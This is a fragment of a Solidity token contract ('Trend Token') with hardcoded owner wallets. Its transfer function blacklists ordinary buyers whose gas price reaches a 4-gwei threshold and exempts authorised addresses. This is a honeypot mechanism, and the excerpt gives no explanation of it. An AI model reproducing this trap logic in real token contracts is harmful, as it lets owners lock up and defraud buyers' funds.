...
contract trend is IBEP20, Auth {
    
    using SafeMath for uint256;

    string constant _name = "Trend Token";
    ...
    uint256 private swapGas = 4 * 1 gwei; 
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingWallet = 0x8CDa8E5025A9CCc7320F41787f1514e404C6E571; 
        devWallet = 0xAfe43862a6Bd97135Fa6dAB60E759b1139420Ca9; 
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(recipient == pair && !authorizations[sender]) {
            require(tx.gasprice <= swapGas);
            require(tradingOpen, "Trading not open yet");
        }

        if(recipient != pair && !authorizations[recipient]) {
            require(tradingOpen, "Trading not open yet");
            if (tx.gasprice >= swapGas) {
                isBlacklisted[recipient] = true;
